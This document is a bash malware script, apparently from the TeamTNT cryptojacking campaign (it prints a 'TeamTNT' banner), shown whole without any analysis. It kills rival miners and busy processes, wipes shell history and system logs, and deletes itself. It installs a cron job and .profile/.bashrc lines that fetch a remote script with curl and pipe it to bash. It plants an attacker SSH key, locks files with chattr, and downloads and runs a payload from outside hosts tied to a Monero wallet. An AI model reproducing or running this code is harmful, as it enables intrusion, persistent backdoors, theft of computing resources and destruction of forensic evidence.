#!/bin/bash 
 
export CHATTR="chattr"
if [ -f /bin/tntcht ];then
    export CHATTR="/bin/tntcht" 
elif [ -f /bin/tntrecht ];then
    export CHATTR="/bin/tntrecht"
fi   
export WGET_CMD="wget"  
if [ -f /bin/wget ];then
    export WGET_CMD="/bin/wget"
elif [ -f /bin/wgettnt ];then
    export WGET_CMD="/bin/wgettnt" 
elif [ -f /bin/TNTwget ];then
    export WGET_CMD="/bin/TNTwget" 
elif [ -f /bin/wge ];then
    export WGET_CMD="/bin/wge" 
elif [ -f /bin/wd1 ];then
    export WGET_CMD="/bin/wd1"
elif [ -f /bin/wget1 ];then
        export WGET_CMD="/bin/wget1" 
elif [ -f /bin/wdt ];then
    export WGET_CMD="/bin/wdt" 
elif [ -f /bin/xget ];then
    export WGET_CMD="/bin/xget" 
elif [ -x "/bin/wdz" ];then
    export WGET_CMD="/bin/wdz"
elif [ -x "/usr/bin/wdz" ];then
    export WGET_CMD="/usr/bin/wdz"
fi  
export PS_CMD="ps"
if [ -f "/bin/ps.original" ];then
    export PS_CMD="/bin/ps.original"
elif [ -f "/bin/ps.lanigiro" ];then
    export PS_CMD="/bin/ps.lanigiro"
fi 
kill $(ps aux|grep -v grep|awk '{if($3>65.0) print $2}') 2>/dev/null

rm -fr /dev/shm/dia/ 2>/dev/null 1>/dev/null
rm -f ~/.bash_history 2>/dev/null 1>/dev/null
touch ~/.bash_history 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
${CHATTR} +i ~/.bash_history 2>/dev/null 1>/dev/null
clear
if [[ "$0" != "bash" ]]; then rm -f $0; fi

cat /dev/null >/var/spool/mail/root 2>/dev/null
cat /dev/null >/var/log/wtmp 2>/dev/null
cat /dev/null >/var/log/secure 2>/dev/null
cat /dev/null >/var/log/cron 2>/dev/null

MOxmrigMOD=http://112.253.11.38/mid.jpg
MOxmrigSTOCK=http://112.253.11.38/mid.jpg
miner_url=https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-static-x64.tar.gz
miner_url_backup=http://oracle.zzhreceive.top/b2f628/father.jpg
config_url=http://oracle.zzhreceive.top/b2f628/cf.jpg
config_url_backup=http://oracle.zzhreceive.top/b2f628/cf.jpg
sh_url=http://oracle.zzhreceive.top/b2f628/cf.jpg
WALLET=43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz.zookp8
VERSION=2.9
if [ $(command -v docker) ];then
    docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "monero" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "slowhttp" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "entrypoint.sh" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "/var/sbin/bash" | awk '{print $1}' | xargs -I % docker kill %
docker images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "registry" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "auto" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "mine" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "monero" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "slowhttp" | awk '{print $3}' | xargs -I % docker rmi -f %
fi
sh_url="http://104.192.82.138/s3f1015"
function clean_cron(){
    ${CHATTR} -R -ia /var/spool/cron 
    ${CHATTR} -ia /etc/crontab 
    ${CHATTR} -R -ia /etc/cron.d 
    ${CHATTR} -R -ia /var/spool/cron/crontabs 
    crontab -r
    (
        crontab -l 2>/dev/null
        echo "*/30 * * * * ${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash > /dev/null 2>&1"
    ) | crontab - 
} 
clean_cron
crontab -l | sed '/base64/d' | crontab -
crontab -l | sed '/update.sh/d' | crontab -
crontab -l | sed '/logo4/d' | crontab -
crontab -l | sed '/logo9/d' | crontab -
crontab -l | sed '/logo0/d' | crontab -
crontab -l | sed '/logo/d' | crontab -
crontab -l | sed '/tor2web/d' | crontab -
crontab -l | sed '/jpg/d' | crontab -
crontab -l | sed '/png/d' | crontab -
crontab -l | sed '/tmp/d' | crontab -
crontab -l | sed '/zmreplchkr/d' | crontab -
crontab -l | sed '/aliyun.one/d' | crontab -
crontab -l | sed '/3.215.110.66.one/d' | crontab -
crontab -l | sed '/pastebin/d' | crontab -
crontab -l | sed '/onion/d' | crontab -
crontab -l | sed '/lsd.systemten.org/d' | crontab -
crontab -l | sed '/shuf/d' | crontab -
crontab -l | sed '/ash/d' | crontab -
crontab -l | sed '/mr.sh/d' | crontab -
crontab -l | sed '/185.181.10.234/d' | crontab -
crontab -l | sed '/localhost.xyz/d' | crontab -
crontab -l | sed '/45.137.151.106/d' | crontab -
crontab -l | sed '/111.90.159.106/d' | crontab -
crontab -l | sed '/github/d' | crontab -
crontab -l | sed '/bigd1ck.com/d' | crontab -
crontab -l | sed '/xmr.ipzse.com/d' | crontab -
crontab -l | sed '/185.181.10.234/d' | crontab -
crontab -l | sed '/146.71.79.230/d' | crontab -
crontab -l | sed '/122.51.164.83/d' | crontab -
crontab -l | sed '/newdat.sh/d' | crontab -
crontab -l | sed '/lib.pygensim.com/d' | crontab -
crontab -l | sed '/t.amynx.com/d' | crontab -
crontab -l | sed '/update.sh/d' | crontab -
crontab -l | sed '/systemd-service.sh/d' | crontab -
crontab -l | sed '/pg_stat.sh/d' | crontab -
crontab -l | sed '/sleep/d' | crontab -
crontab -l | sed '/oka/d' | crontab -
crontab -l | sed '/linux1213/d' | crontab -
crontab -l | sed '/zsvc/d' | crontab -
crontab -l | sed '/_cron/d' | crontab -
crontab -l | sed '/31.210.20.181/d' | crontab -
function lock_cron()
{
    ${CHATTR} -R +ia /var/spool/cron 
    touch /etc/crontab
    ${CHATTR} +ia /etc/crontab 
    ${CHATTR} -R +ia /var/spool/cron/crontabs 
    ${CHATTR} -R +ia /etc/cron.d 
} 
lock_cron    
sname=$(whoami)  
function makesshaxx(){  
    RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDm2krFRMHvJfXs2x2yYEterNauzo2NCqSarLQZAtVVQ0hT/uPF1ytWMWy7/bjhgZpTnIqfofLXEx1IAA9K+UyOE3NSK63YhQYlwBSJSi+mNMYx80r5P7seo+JUeW9Vr12M4BWg7VMGn6VZevo+OVBAcX3z7MPMkLNPzNycFU7SOfSMam2cm/99xlVGeYi9QZ1W/fypsmyoDSvVuppQe05VkMx/umFuWeSrI47dab4+dfxQuS1e+7/8rSqSD57YLY9qW+o/yl/K2FJ7sZg3XsGplhiNC8RHMFF8pNh16TLZb3m7Jx+x4Xtjf82B2YmoszD+2hqKeSo8c5BcDgrJSVrhIhvQ0nrFtIi8rZsZQafyEkQXZOeTgH79f59/yeJuB1IP4zYkMrJP5Gt9rqTImz6wF7d87pBfPnXFUGFZDT3e+Kbe+fpYOb6CRZmWur0gTenocN2xiRw7neTT6uZcbp1D3ICAqfUmLunZHW6dK6IoiCs7A6y5fHk1hxBJY7x1UA0= ${sname}@pending.com"

    mkdir ${HOME}/.ssh/ -p  
    ${CHATTR} -ia ${HOME}/.ssh/authorized_keys
    touch ${HOME}/.ssh/authorized_keys  
    chmod 600 ${HOME}/.ssh/authorized_keys 
    grep  ${sname}@pending.com ${HOME}/.ssh/authorized_keys 
    grep -q ${sname}@pending.com ${HOME}/.ssh/authorized_keys || echo $RSAKEY > ${HOME}/.ssh/authorized_keys
    ${CHATTR}  +ia ${HOME}/.ssh/authorized_keys

    ${CHATTR} -ia ${HOME}/.ssh/authorized_keys2
    touch ${HOME}/.ssh/authorized_keys2  
    chmod 600 ${HOME}/.ssh/authorized_keys2  
    grep -q ${sname}@pending.com ${HOME}/.ssh/authorized_keys2 || echo $RSAKEY > ${HOME}/.ssh/authorized_keys2
    ${CHATTR} +ia ${HOME}/.ssh/authorized_keys2 
    if ! grep "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" ${HOME}/.profile > /dev/null;then
        echo "{" >>${HOME}/.profile
        echo "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" >>${HOME}/.profile
        echo "} > /dev/null 2>&1" >> ${HOME}/.profile
    fi  
    if ! grep "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" ${HOME}/.bashrc > /dev/null;then
        echo "{" >> ${HOME}/.bashrc
        echo "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" >>${HOME}/.bashrc
        echo "} > /dev/null 2>&1" >> ${HOME}/.bashrc
    fi 
}    

######################### printing greetings ###########################
echo -e " "
echo -e "                                \e[1;34;49m___________                 _____________________________\033[0m"
echo -e "                                \e[1;34;49m\__    ___/___ _____    ____\__    ___/\      \__    ___/\033[0m"
echo -e "                                \e[1;34;49m  |    |_/ __ \\__  \  /     \|    |   /   |   \|    |   \033[0m"
echo -e "                                \e[1;34;49m  |    |\  ___/ / __ \|  Y Y  \    |  /    |    \    |   \033[0m"
echo -e "                                \e[1;34;49m  |____| \___  >____  /__|_|  /____|  \____|__  /____|   \033[0m"
echo -e "                                \e[1;34;49m             \/     \/      \/                \/         \033[0m"
echo -e " "
echo -e "                                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ "
echo -e " "
echo -e "                                \e[1;34;49m            Now you get, what i want to give... --- '''      \033[0m"
echo " "
echo " "
    
## now the bad part of the script###

 
makesshaxx 

if [ ! -f "/var/tmp/.psla" ]; then 
    echo 'lockfile' > /var/tmp/.psla
    ${CHATTR} +i /var/tmp/.alsp
else
  echo "replay .. i know this server ..."
fi 


export MOHOME="/var/tmp/..."
mkdir -p ${MOHOME}
${WGET_CMD}  -q --tries=3 --timeout=10 -O ${MOHOME}/httpd-w ${sh_url}/s/w.2.tar.gz
chmod a+x ${MOHOME}/httpd-w
cd ${MOHOME}   
./httpd-w 2>/dev/null 1>/dev/null
history -c

exit 0

## now the bad part of the script###
